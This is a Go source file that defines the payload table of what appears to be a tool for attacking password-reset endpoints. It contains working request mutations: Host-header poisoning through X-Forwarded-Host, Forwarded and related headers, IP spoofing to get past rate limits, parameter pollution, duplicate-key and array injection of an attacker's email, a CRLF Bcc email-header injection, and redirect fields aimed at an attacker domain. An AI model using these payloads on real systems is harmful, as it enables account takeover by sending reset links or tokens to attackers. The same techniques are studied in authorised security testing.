package main

import (
	"fmt"
	"strings"
)

type Payload struct {
	Name        string
	Mode        string
	Description string
	// Preview returns a human-readable before→after summary of what this payload changes.
	Preview func(r ParsedRequest, attackerDomain, attackerEmail string) string
	Apply   func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest
}

var Payloads = []Payload{
	// ── HOST HEADER PAYLOADS ──────────────────────────────────────────────
	{
		Name:        "X-Forwarded-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Host header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Forwarded-Host", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Forwarded-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Original-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Original-Host header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Original-Host", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Original-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Host header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Host", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Forwarded",
		Mode:        "header",
		Description: "inject attacker domain via Forwarded header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "Forwarded", "", "host="+attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Forwarded"] = []string{"host=" + attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Forwarded-Server",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Server header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Forwarded-Server", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Forwarded-Server"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-HTTP-Host-Override",
		Mode:        "header",
		Description: "inject attacker domain via X-HTTP-Host-Override header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-HTTP-Host-Override", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-HTTP-Host-Override"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Host override",
		Mode:        "header",
		Description: "replace Host header directly with attacker domain",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("replace", "Host", r.Host, attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Host = attackerDomain
			r.Headers["Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Host append",
		Mode:        "header",
		Description: "append attacker domain to original host",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("append", "Host", r.Host, r.Host+"."+attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Host"] = []string{r.Host + "." + attackerDomain}
			return r
		},
	},
	{
		Name:        "Host fragment",
		Mode:        "header",
		Description: "inject attacker domain with fragment to bypass validation",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("replace", "Host", r.Host, attackerDomain+"#"+r.Host)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Host"] = []string{attackerDomain + "#" + r.Host}
			return r
		},
	},
	{
		Name:        "X-Forwarded-Proto",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Proto header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Forwarded-Proto", "", attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Forwarded-Proto"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Referer header",
		Mode:        "header",
		Description: "inject attacker domain via Referer — some servers reflect it in reset link",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			orig := ""
			if v := r.Headers["Referer"]; len(v) > 0 {
				orig = v[0]
			}
			return PreviewHeader("replace", "Referer", orig, "https://"+attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Referer"] = []string{"https://" + attackerDomain}
			return r
		},
	},
	{
		Name:        "Origin header",
		Mode:        "header",
		Description: "inject attacker domain via Origin header",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			orig := ""
			if v := r.Headers["Origin"]; len(v) > 0 {
				orig = v[0]
			}
			return PreviewHeader("replace", "Origin", orig, "https://"+attackerDomain)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Origin"] = []string{"https://" + attackerDomain}
			return r
		},
	},
	// ── IP SPOOFING HEADERS ───────────────────────────────────────────────
	{
		Name:        "X-Forwarded-For spoof",
		Mode:        "header",
		Description: "spoof IP via X-Forwarded-For for rate limit bypass",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Forwarded-For", "", "127.0.0.1")
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Forwarded-For"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "X-Real-IP spoof",
		Mode:        "header",
		Description: "spoof IP via X-Real-IP for rate limit bypass",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "X-Real-IP", "", "127.0.0.1")
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["X-Real-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "Client-IP spoof",
		Mode:        "header",
		Description: "spoof IP via Client-IP for rate limit bypass",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "Client-IP", "", "127.0.0.1")
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["Client-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "True-Client-IP spoof",
		Mode:        "header",
		Description: "spoof IP via True-Client-IP for rate limit bypass",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			return PreviewHeader("add", "True-Client-IP", "", "127.0.0.1")
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Headers["True-Client-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	// ── BODY MANIPULATION PAYLOADS ────────────────────────────────────────
	{
		Name:        "Array injection",
		Mode:        "body",
		Description: "wrap field values in array with attacker value appended",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Mixed array",
		Mode:        "body",
		Description: "first field becomes array with attacker value, rest stay as strings",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			first := true
			for k, v := range modified {
				if first {
					modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
					first = false
				}
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			first := true
			for k, v := range r.Fields {
				if first {
					r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
					first = false
				}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Null confusion",
		Mode:        "body",
		Description: "set all field values to null",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k := range modified {
				modified[k] = nil
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = nil
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Int confusion",
		Mode:        "body",
		Description: "set all field values to 0",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k := range modified {
				modified[k] = 0
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = 0
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Bool confusion",
		Mode:        "body",
		Description: "set all field values to true",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k := range modified {
				modified[k] = true
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = true
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Duplicate keys",
		Mode:        "body",
		Description: "repeat each field key with attacker value second — parser picks last or first",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			var lines []string
			arrow := "\033[33m→\033[0m"
			dim := "\033[2m"
			reset := "\033[0m"
			bold := "\033[1m"
			for k, v := range r.Fields {
				evil := InjectValue(k, attackerEmail, attackerDomain)
				lines = append(lines, fmt.Sprintf("  %s~%s %s%s%s: %s  %s  %s, %s (duplicate key)",
					bold, reset, dim, k, reset, anyToString(v), arrow, anyToString(v), evil))
			}
			return strings.Join(lines, "\n")
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			// build raw JSON manually to allow duplicate keys
			// use anyToString to safely convert any field value type (avoids panic)
			raw := "{"
			for k, v := range r.Fields {
				raw += `"` + k + `":"` + fmt.Sprintf("%v", v) + `",`
				raw += `"` + k + `":"` + InjectValue(k, attackerEmail, attackerDomain) + `",`
			}
			raw = raw[:len(raw)-1] + "}"
			UpdateContentLength(&r, raw)
			r.Body = raw
			return r
		},
	},
	{
		Name:        "HTML injection",
		Mode:        "body",
		Description: "inject HTML into field values — tests if reflected unsanitized in email",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = "<b>" + anyToString(v) + "</b>"
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = "<b>" + fmt.Sprintf("%v", v) + "</b>"
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Extra fields",
		Mode:        "body",
		Description: "append common callback/redirect fields pointing to attacker domain",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			extras := []string{"redirectUrl", "callbackUrl", "next", "returnUrl", "callback", "redirect"}
			for _, k := range extras {
				modified[k] = "https://" + attackerDomain
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			extras := []string{"redirectUrl", "callbackUrl", "next", "returnUrl", "callback", "redirect"}
			for _, k := range extras {
				r.Fields[k] = "https://" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Nested object",
		Mode:        "body",
		Description: "wrap field values in nested object — tests alternative parsing paths",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = map[string]any{"value": v, "email": InjectValue(k, attackerEmail, attackerDomain)}
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = map[string]any{"value": v, "email": InjectValue(k, attackerEmail, attackerDomain)}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Comma separated",
		Mode:        "body",
		Description: "append attacker value comma-separated in field string",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = anyToString(v) + "," + InjectValue(k, attackerEmail, attackerDomain)
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = fmt.Sprintf("%v", v) + "," + InjectValue(k, attackerEmail, attackerDomain)
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Pipe separated",
		Mode:        "body",
		Description: "append attacker value pipe-separated in field string",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = anyToString(v) + "|" + InjectValue(k, attackerEmail, attackerDomain)
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = fmt.Sprintf("%v", v) + "|" + InjectValue(k, attackerEmail, attackerDomain)
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "CRLF injection",
		Mode:        "body",
		Description: "inject CRLF + Bcc header into field value for email header injection",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = anyToString(v) + "%0aBcc:" + InjectValue(k, attackerEmail, attackerDomain)
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = fmt.Sprintf("%v", v) + "%0aBcc:" + InjectValue(k, attackerEmail, attackerDomain)
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "backup_email field",
		Mode:        "body",
		Description: "add backup_email field pointing to attacker — some servers send reset to both",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			modified["backup_email"] = InjectValue("email", attackerEmail, attackerDomain)
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Fields["backup_email"] = InjectValue("email", attackerEmail, attackerDomain)
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Nested user.email",
		Mode:        "body",
		Description: "add nested user object with attacker email — alternative parsing path",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			modified := DeepCopyFields(r.Fields)
			modified["user"] = map[string]any{"email": InjectValue("email", attackerEmail, attackerDomain)}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			r.Fields["user"] = map[string]any{"email": InjectValue("email", attackerEmail, attackerDomain)}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Parameter pollution form",
		Mode:        "body",
		Description: "duplicate all params with attacker value second (form-encoded only)",
		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
			if r.BodyType != "form" {
				return "  (skipped — not a form-encoded request)"
			}
			modified := DeepCopyFields(r.Fields)
			for k, v := range modified {
				modified[k] = anyToString(v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
			}
			return PreviewBodyFields(r.Fields, modified)
		},
		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
			if r.BodyType != "form" {
				return r
			}
			for k, v := range r.Fields {
				r.Fields[k] = fmt.Sprintf("%v", v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
}
